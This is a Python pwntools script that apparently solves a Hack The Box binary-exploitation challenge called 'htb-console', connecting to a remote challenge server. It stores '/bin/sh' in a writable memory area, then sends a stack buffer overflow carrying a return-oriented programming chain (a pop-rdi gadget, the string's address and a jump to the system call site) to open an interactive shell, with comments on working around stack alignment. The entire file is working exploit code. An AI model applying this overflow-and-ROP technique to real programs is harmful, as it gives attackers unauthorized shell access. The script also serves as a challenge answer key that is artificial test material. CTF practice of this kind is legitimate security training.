from pwn import *
import time

context.binary = 'htb-console'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = "83.136.255.40"
PORT = "35116"

def get_process():
  #proc = process()
  proc = remote(HOST, PORT)

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""
    b *0x401040
    c
  """)
  time.sleep(3)

def main():
  proc = get_process()
  #attach_gdb(proc)

  # Write /bin/sh in the hof area, so basically an area we can write to so we can pass a pointer to system
  # then call flag, and rop to system, with the pointer of our user controlled information
  # gadget to pop into rdi
  # call system from plt
  
  # Try to do this in one shot???

  # Write in /bin/sh 
  proc.sendlineafter(b'>> ', b'hof')
  proc.sendlineafter(b'Enter your name: ', b'/bin/sh\x00')

  # Start your exploit with system
  proc.sendlineafter(b'>> ', b'flag')
  plt_system = p64(0x401381)
  #plt_system = p64(0x401040)
  rw_data = p64(0x4040b0)

  elf = context.binary = ELF('./htb-console', checksec=False)
  print(hex(elf.plt.system))


  # Normally you could use plt_system, however, there is a stack alignment issue, where the stack is at an 8 offset, and it needs to be 0
  # So we can't directly call PLT like normal, cause we would add a ret gadget to fix the call
  # What we can do is just return to the text segment code where system is called

  g_pop_rdi = p64(0x401473)
  g_ret = p64(0x40101a)

  offset = b'A' * 0x18

  payload = b''.join([
    offset,
    g_pop_rdi,
    rw_data,
    plt_system
  ])

  proc.sendlineafter(b'Enter flag: ', payload)
  proc.interactive()

if __name__ == '__main__':
  main()
